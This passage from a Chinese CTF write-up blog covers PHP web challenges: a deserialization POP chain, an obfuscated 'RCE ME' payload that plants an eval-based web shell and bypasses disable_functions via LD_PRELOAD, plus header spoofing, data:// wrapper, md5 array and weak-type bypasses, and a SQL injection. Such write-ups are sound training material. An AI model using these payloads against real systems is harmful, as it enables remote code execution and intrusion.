class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> w22m();</span><br><span class="line"></span><br><span class="line">$b = <span class="keyword">new</span> w33m();</span><br><span class="line"></span><br><span class="line">$c = <span class="keyword">new</span> w44m();</span><br><span class="line"></span><br><span class="line">$b -&gt; w00m = $c;</span><br><span class="line"></span><br><span class="line">$b -&gt; w22m = <span class="string">&quot;GetFlag&quot;</span>;</span><br><span class="line"></span><br><span class="line">$a -&gt; w00m = $b;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><p>首先任取三个变量，比如我这里取了a，b，c</p><p>分别赋值新的三个类</p><p>让变量b里的属性w00m赋值为w44m，也就是满足</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if($this-&gt;admin &#x3D;&#x3D;&#x3D; &#39;w44m&#39; &amp;&amp; $this-&gt;passwd &#x3D;&#x3D;&#x3D;&#39;08067&#39;)</span><br></pre></td></tr></table></figure><p>另外一个属性w22m赋值“GetFlag”，完成调用函数的步骤</p><p>利用了这句**$this-&gt;w00m-&gt;{$this-&gt;w22m}**，这样就实现w44m -&gt; GetFlag()</p><p>之后让变量a里的属性w00m赋值b</p><p>随之会触发析构函数_destruct</p><p>最后的urlencode是因为题目里的获取参数值是get获取，会经过浏览器的url解析。</p><p>完整payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $admin = <span class="string">&#x27;w44m&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> $passwd = <span class="string">&#x27;08067&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;admin === <span class="string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="keyword">$this</span>-&gt;passwd ===<span class="string">&#x27;08067&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;admin;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;passwd;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nono&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $w00m;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $w00m;</span><br><span class="line">    <span class="keyword">public</span> $w22m;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;w00m-&gt;&#123;<span class="keyword">$this</span>-&gt;w22m&#125;();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> w22m();</span><br><span class="line">$b = <span class="keyword">new</span> w33m();</span><br><span class="line">$c = <span class="keyword">new</span> w44m();</span><br><span class="line">$b -&gt; w00m = $c;</span><br><span class="line">$b -&gt; w22m = <span class="string">&quot;GetFlag&quot;</span>;</span><br><span class="line">$a -&gt; w00m = $b;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/10/04/web/2/image-20211009203101560.png" alt="image-20211009203101560"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参与了一下&lt;/p&gt;
&lt;p&gt;新生赛，发现基础还不够扎实&lt;/p&gt;
&lt;p&gt;顺便记录一下解题&lt;/p&gt;
&lt;h3 id=&quot;gift-F12&quot;&gt;&lt;a href=&quot;#gift-F12&quot; class=&quot;headerlink&quot; title=&quot;gift_F12&quot;&gt;&lt;/a&gt;gift_F12&lt;/h3</summary>
      
    
    
    
    
    <category term="web" scheme="http://daweitech.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>极客大挑战 2019 RCE ME</title>
    <link href="http://daweitech.github.io/2021/09/29/buu/25/"/>
    <id>http://daweitech.github.io/2021/09/29/buu/25/</id>
    <published>2021-09-29T13:28:21.000Z</published>
    <updated>2021-09-29T13:54:19.423Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2021/09/29/buu/25/image-20210929213110592.png" alt="image-20210929213110592"></p><p>GET传参</p><p>strlen：长度不超过40</p><p>preg_match：匹配英文字母和数字，die NO</p><p>满足条件就当做php执行并且不报错</p><p>[<a href="https://www.cnblogs.com/yunqian2017/p/13308599.html">极客大挑战 2019]RCE ME - 云千 - 博客园 (cnblogs.com)</a></p><p>参考：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">可以用异或或者取反绕过</span><br><span class="line">异或绕过是指使用各种特殊字符的异或构造出字母和数字。取反绕过是对语句取反。</span><br></pre></td></tr></table></figure><p>生成查询PHP info 的payload代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">echo</span> urlencode(~<span class="string">&#x27;phpinfo&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>即，对查询语句取反，然后编码。在编码前加上~进行取反，括号没有被过滤，不用取反。</p><p>构造完的语句进行查询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure><p><img src="/2021/09/29/buu/25/image-20210929213713432.png" alt="image-20210929213713432"></p><p>看一些信息:</p><p><img src="/2021/09/29/buu/25/image-20210929213849813.png" alt="image-20210929213849813"></p><p>禁用的函数相当的多</p><p>先传木马连接</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$a=<span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">$b=urlencode(~$a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">$c=<span class="string">&#x27;(eval($_POST[mochu7]))&#x27;</span>;</span><br><span class="line">$d=urlencode(~$c);</span><br><span class="line"><span class="keyword">echo</span> $d;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%92%90%9C%97%8A%C8%A2%D6%D6); </span><br></pre></td></tr></table></figure><p><img src="/2021/09/29/buu/25/image-20210929214111148.png" alt="image-20210929214111148"></p><p>连上之后发现权限过低</p><p><img src="/2021/09/29/buu/25/image-20210929214319688.png" alt="image-20210929214319688"></p><p>要读取flag，需要先执行readflag,但是因为禁用了很多函数，没有办法执行命令，这时候需要绕过disable_functions.方法好像很多，有的用蚁剑的插件，有的劫持共享so，也有一些工具<br>1.这里用工具<br>地址<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a><br>由于在/var/tmp目录 有上传权限，可以上传bypass_disablefun_x64.so和bypass_disablefunc.php（重命名为shell.php），</p><p>2.蚁剑插件直接绕过</p><p><img src="/2021/09/29/buu/25/image-20210929214454384.png" alt="image-20210929214454384"></p><p><img src="/2021/09/29/buu/25/image-20210929214557378.png" alt="image-20210929214557378"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/2021/09/29/buu/25/image-20210929213110592.png&quot; alt=&quot;image-20210929213110592&quot;&gt;&lt;/p&gt;
&lt;p&gt;GET传参&lt;/p&gt;
&lt;p&gt;strlen：长度不超过40&lt;/p&gt;
&lt;p&gt;preg_m</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>MRCTF2020 wirteup</title>
    <link href="http://daweitech.github.io/2021/09/28/buu/24/"/>
    <id>http://daweitech.github.io/2021/09/28/buu/24/</id>
    <published>2021-09-28T11:31:00.000Z</published>
    <updated>2021-09-29T08:44:19.842Z</updated>
    
    <content type="html"><![CDATA[<p>​    参考了Y1ng大佬的博客：<a href="https://www.gem-love.com/ctf/2184.html">https://www.gem-love.com/ctf/2184.html</a></p><p>真的写得很棒，看着十分舒服，还在评论区提出一点小建议（希望不会被师傅嘲笑）</p><h2 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a>套娃</h2><p>这题难度不大，我卡在了编写脚本上</p><p><img src="/2021/09/28/buu/24/image-20210928193418732.png" alt="image-20210928193418732"></p><p>常规源码查看</p><p><img src="/2021/09/28/buu/24/image-20210928193507092.png" alt="image-20210928193507092"></p><p>这里的绕过和BJDCTF的Ezphp一段代码类似，本来以为也可以url编码绕过</p><p>结果上面出现了计数：%5f不能出现，因为_编码后就是%5f,所以就要求其他方法绕过了</p><p>_ 用 ‘  ’ 绕过，而后面的正则匹配表示匹配字符串的开头和结尾</p><p>在字符串中换行可以表示字符串的结尾，所以可以用%0a（换行符的url编码）绕过</p><p>所以payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?b u p t&#x3D;23333%0a</span><br></pre></td></tr></table></figure><p><img src="/2021/09/28/buu/24/image-20210928194036030.png" alt="image-20210928194036030"></p><p>得到提示</p><p>去访问secrettw.php页面</p><p><img src="/2021/09/28/buu/24/image-20210928194130440.png" alt="image-20210928194130440"></p><p>whoa，被挡了</p><p>添加Client-ip：127.0.0.1</p><p><img src="/2021/09/28/buu/24/image-20210928194319439.png" alt="image-20210928194319439"></p><p>再次查看源码：</p><p><img src="/2021/09/28/buu/24/image-20210928194351650.png" alt="image-20210928194351650"></p><h4 id="jsfuck"><a href="#jsfuck" class="headerlink" title="jsfuck"></a>jsfuck</h4><p>原来是和js有关的代码，</p><p><img src="/2021/09/28/buu/24/image-20210928194516235.png" alt="image-20210928194516235"></p><p>提示我们posy传参Merak</p><p>任意赋值：Merak=1</p><p><img src="/2021/09/28/buu/24/image-20210928194610158.png" alt="image-20210928194610158"></p><p>好了，源码出来了</p><p>代码分析：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function change($v)&#123; </span><br><span class="line">  $v &#x3D; base64_decode($v); </span><br><span class="line">  $re &#x3D; &#39;&#39;; </span><br><span class="line">  for($i&#x3D;0;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">    $re .&#x3D; chr ( ord ($v[$i]) + $i*2 ); </span><br><span class="line">  &#125; </span><br><span class="line">  return $re; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可以写一个逆向的脚本来满足要求：</p><h4 id="逆方向脚本"><a href="#逆方向脚本" class="headerlink" title="逆方向脚本"></a>逆方向脚本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function unchange($v)&#123; </span><br><span class="line">    $re &#x3D; &#39;&#39;;</span><br><span class="line">    for($i&#x3D;0;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .&#x3D; chr ( ord ($v[$i]) - $i*2 ); </span><br><span class="line">    &#125; </span><br><span class="line">    return $re; </span><br><span class="line">&#125;</span><br><span class="line">$real_flag &#x3D; unchange(&#39;flag.php&#39;);</span><br><span class="line">echo base64_encode($real_flag);</span><br><span class="line">&#x2F;&#x2F;ZmpdYSZmXGI&#x3D;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>得到：ZmpdYSZmXGI=</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ip &#x3D; getIp();</span><br><span class="line">if($ip!&#x3D;&#39;127.0.0.1&#39;)</span><br><span class="line">echo &quot;Sorry,you don&#39;t have permission! Your ip is :&quot;.$ip;</span><br><span class="line">if($ip &#x3D;&#x3D;&#x3D; &#39;127.0.0.1&#39; &amp;&amp; file_get_contents($_GET[&#39;2333&#39;]) &#x3D;&#x3D;&#x3D; &#39;todat is a happy day&#39; )&#123;</span><br><span class="line">echo &quot;Your REQUEST is:&quot;.change($_GET[&#39;file&#39;]);</span><br><span class="line">echo file_get_contents(change($_GET[&#39;file&#39;])); &#125;</span><br></pre></td></tr></table></figure><p>ip我们已经添加了</p><h4 id="data伪协议"><a href="#data伪协议" class="headerlink" title="data伪协议"></a>data伪协议</h4><p>传入参数2333用伪协议绕过，?2333=data://text/plain,todat is a happy day</p><p>这里有的师傅特意用了base64绕过：data://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=</p><p>file传入我们尚书脚本跑出的数据：file=ZmpdYSZmXGI=</p><p>到这里小心一个坑，就是不用再post传参了：</p><p>不然会被highlight_file函数截断</p><p>然后一键flag啦</p><p><img src="/2021/09/28/buu/24/image-20210928195347754.png" alt="image-20210928195347754"></p><p><img src="/2021/09/28/buu/24/image-20210928195408850.png" alt="image-20210928195408850"></p><h2 id="Ez-bypass"><a href="#Ez-bypass" class="headerlink" title="Ez_bypass"></a>Ez_bypass</h2><p>比较简单的代码审计题</p><p><img src="/2021/09/28/buu/24/image-20210929155243165.png" alt="image-20210929155243165"></p><p>整理一下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">I put something in F12 for you</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line">$flag&#x3D;&#39;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#39;;</span><br><span class="line">if(isset($_GET[&#39;gg&#39;])&amp;&amp;isset($_GET[&#39;id&#39;])) &#123;</span><br><span class="line">    $id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">    $gg&#x3D;$_GET[&#39;gg&#39;];</span><br><span class="line">    if (md5($id) &#x3D;&#x3D;&#x3D; md5($gg) &amp;&amp; $id !&#x3D;&#x3D; $gg) &#123;</span><br><span class="line">        echo &#39;You got the first step&#39;;</span><br><span class="line">        if(isset($_POST[&#39;passwd&#39;])) &#123;</span><br><span class="line">            $passwd&#x3D;$_POST[&#39;passwd&#39;];</span><br><span class="line">            if (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 if($passwd&#x3D;&#x3D;1234567)</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &#39;Good Job!&#39;;</span><br><span class="line">                     highlight_file(&#39;flag.php&#39;);</span><br><span class="line">                     die(&#39;By Retr_0&#39;);</span><br><span class="line">                 &#125;</span><br><span class="line">                 else</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &quot;can you think twice??&quot;;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                echo &#39;You can not get it !&#39;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&#39;only one way to get the flag&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        echo &quot;You are not a real hacker!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#39;Please input first&#39;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure><p>开头看到十分熟悉的include</p><p>告诉我们这个页面可以打印出和flag.php里一样的变量值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#39;gg&#39;])&amp;&amp;isset($_GET[&#39;id&#39;])) &#123;</span><br><span class="line">    $id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">    $gg&#x3D;$_GET[&#39;gg&#39;];</span><br><span class="line">    if (md5($id) &#x3D;&#x3D;&#x3D; md5($gg) &amp;&amp; $id !&#x3D;&#x3D; $gg) &#123;</span><br><span class="line">        echo &#39;You got the first step&#39;;</span><br></pre></td></tr></table></figure><h4 id="MD5值相同的变量"><a href="#MD5值相同的变量" class="headerlink" title="MD5值相同的变量"></a>MD5值相同的变量</h4><p>第一层，要求GET传入变量gg和id，两个变量的值不同但是md5值要相同</p><p>自然想到数组绕过（也可以去找0e开头MD5相同的一组值）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?gg[]&#x3D;1&amp;id[]&#x3D;2</span><br></pre></td></tr></table></figure><p><img src="/2021/09/28/buu/24/image-20210929155726680.png" alt="image-20210929155726680"></p><p>看第二个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;You got the first step&#39;;</span><br><span class="line">        if(isset($_POST[&#39;passwd&#39;])) &#123;</span><br><span class="line">            $passwd&#x3D;$_POST[&#39;passwd&#39;];</span><br><span class="line">            if (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 if($passwd&#x3D;&#x3D;1234567)</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &#39;Good Job!&#39;;</span><br><span class="line">                     highlight_file(&#39;flag.php&#39;);</span><br><span class="line">                     die(&#39;By Retr_0&#39;);</span><br><span class="line">                 &#125;</span><br></pre></td></tr></table></figure><h4 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title="PHP弱类型"></a>PHP弱类型</h4><p>这里考察了php弱类型的知识</p><p>当传入字符串时，==会强制转换为数字再进行比较</p><p>所以POST传参：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd&#x3D;1234567a</span><br></pre></td></tr></table></figure><p><img src="/2021/09/28/buu/24/image-20210929160016795.png" alt="image-20210929160016795"></p><h2 id="Ezaudit"><a href="#Ezaudit" class="headerlink" title="Ezaudit"></a>Ezaudit</h2><p><img src="/2021/09/28/buu/24/image-20210929161638378.png" alt="image-20210929161638378"></p><p>开幕雷击，doge</p><p>哈哈其实是我学爬虫的视频介绍网站模板的时候就是跟这个同一家，很亲切</p><p>发现页面不太友好，没有任何提示</p><h4 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h4><p>dirsearch扫一下，有源码泄露：<a href="http://www.zip/">www.zip</a></p><p>下载下来得到index.php的源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html; charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line">    $username = $_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    $password = $_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    $Private_key = $_POST[<span class="string">&#x27;Private_key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (($username == <span class="string">&#x27;&#x27;</span>) || ($password == <span class="string">&#x27;&#x27;</span>) ||($Private_key == <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">        <span class="comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span></span><br><span class="line">        header(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($Private_key != <span class="string">&#x27;*************&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        header(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($Private_key === <span class="string">&#x27;************&#x27;</span>)&#123;</span><br><span class="line">        $getuser = <span class="string">&quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;<span class="subst">$password</span>&#x27;&quot;</span>.<span class="string">&#x27;;&#x27;</span>; </span><br><span class="line">        $link=mysql_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line">        mysql_select_db(<span class="string">&quot;test&quot;</span>,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        <span class="keyword">while</span>($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>.$row[<span class="string">&quot;username&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>.$row[<span class="string">&quot;flag&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// genarate public_key </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span>(<span class="params">$length = <span class="number">16</span></span>) </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $public_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//genarate private_key</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">private_key</span>(<span class="params">$length = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $private_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key = public_key();</span><br><span class="line">  <span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr&#x27;s private_key???</span></span><br></pre></td></tr></table></figure><p>代码里告诉了我们一个页面：login.html</p><p>访问看一下：</p><p><img src="/2021/09/28/buu/24/image-20210929161956786.png" alt="image-20210929161956786"></p><p>分析了一下代码</p><p>用户名和密码、私钥都不能为空</p><p>按照第三段判断，</p><p>用户名为crispr，密码那里可以看到很明显的单引号SQL注入漏洞</p><p>难的就是私钥啊啊啊</p><h4 id="直接借用Y1ng大佬的过程"><a href="#直接借用Y1ng大佬的过程" class="headerlink" title="直接借用Y1ng大佬的过程"></a>直接借用Y1ng大佬的过程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 